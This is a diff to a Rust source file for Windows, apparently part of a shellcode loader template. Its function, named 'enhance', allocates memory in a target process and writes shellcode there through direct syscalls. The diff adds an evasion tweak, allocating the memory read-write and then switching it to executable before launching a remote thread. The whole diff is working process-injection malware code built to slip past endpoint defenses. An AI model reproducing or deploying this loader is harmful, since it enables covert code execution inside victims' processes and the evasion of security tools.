@@ -9,7 +9,7 @@ use ntapi::{
 };
 use winapi::{
     um::{
-        winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE, MEM_RESERVE, GENERIC_ALL},
+        winnt::{MEM_COMMIT, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, MEM_RESERVE, GENERIC_ALL},
         lmaccess::{ACCESS_ALL}
     },
     shared::{
@@ -20,8 +20,8 @@ use ntapi::winapi::ctypes::c_void;
 use ntapi::ntpsapi::PS_ATTRIBUTE_LIST;
 use std::mem::zeroed;
 use winapi::shared::ntdef::NULL;
-
-//use ntapi::ntpsapi::NtCreateThreadEx;
+use winapi::um::errhandlingapi::GetLastError;
+use ntapi::ntpsapi::NtCreateThreadEx;
 
 {{IMPORTS}}
 
@@ -58,14 +58,14 @@ fn enhance(mut buf: Vec<u8>, tar:usize) {
             0,
             &mut size, 
             MEM_COMMIT | MEM_RESERVE, 
-            PAGE_EXECUTE_READWRITE
+            PAGE_READWRITE
         );
         if !NT_SUCCESS(alloc_status) {
             panic!("Error allocating memory to the target process: {}", alloc_status);
         }
         let mut bytes_written = 0;
         let buffer = buf.as_mut_ptr() as *mut c_void;
-        let buffer_length = buf.len();
+        let mut buffer_length = buf.len();
 
         let write_status = syscall!(
             "NtWriteVirtualMemory", 
@@ -79,26 +79,43 @@ fn enhance(mut buf: Vec<u8>, tar:usize) {
             panic!("Error writing shellcode to memory of the target process: {}", write_status);
         }
 
+        let mut old_perms = PAGE_READWRITE;
+        let write_status = syscall!(
+            "NtProtectVirtualMemory", 
+            process_handle,
+            &mut allocstart,
+            &mut buffer_length,
+            PAGE_EXECUTE_READWRITE,
+            &mut old_perms
+        );
+        if !NT_SUCCESS(write_status) {
+            panic!("Error changing memory attributes: {}", write_status);
+        }
+
         let mut thread_handle : *mut c_void = null_mut();
         let handle = process_handle as *mut c_void;
-        let mut oa = zeroed::<OBJECT_ATTRIBUTES>();
-        let mut pa = zeroed::<PS_ATTRIBUTE_LIST>(); 
-        
-        /*let write_thread = syscall!(
+        let mut oa = zeroed::<OBJECT_ATTRIBUTES>(); 
+        let mut pa = zeroed::<PS_ATTRIBUTE_LIST>();
+
+        // needs null_mut() on third arg and last:
+        //let write_thread = NtCreateThreadEx(&mut thread_handle, GENERIC_ALL, null_mut(), handle, allocstart, NULL, 0, 0, 0, 0, &mut pa);
+         
+        let write_thread = syscall!(
             "NtCreateThreadEx",
             &mut thread_handle,
             GENERIC_ALL, 
-            &mut oa,
+            NULL,
             handle,
-            NULL, 
+            allocstart,
             NULL,
             0, 
             0, 
             0, 
             0, 
-            &mut pa
+            NULL
         );
-        */
+        
+        /* 
         let write_thread = syscall!(
             "NtCreateThreadEx",
             &mut thread_handle,
@@ -113,14 +130,12 @@ fn enhance(mut buf: Vec<u8>, tar:usize) {
             0, 
             &mut lol3
         );
-
-        //let write_thread = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, null_mut(), handle, allocstart, null_mut(), 0, 0, 0, 0, null_mut());
-        //let write_thread = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, lol1, handle, allocstart, lol2, 0, 0, 0, 0, lol3);
-
+        */
         if !NT_SUCCESS(write_thread) {
+            let last_error = GetLastError();
+            println!("Last error: {}", last_error);
             panic!("Error failed to create remote thread: {}", write_thread);
         }
-
     }
 }
 
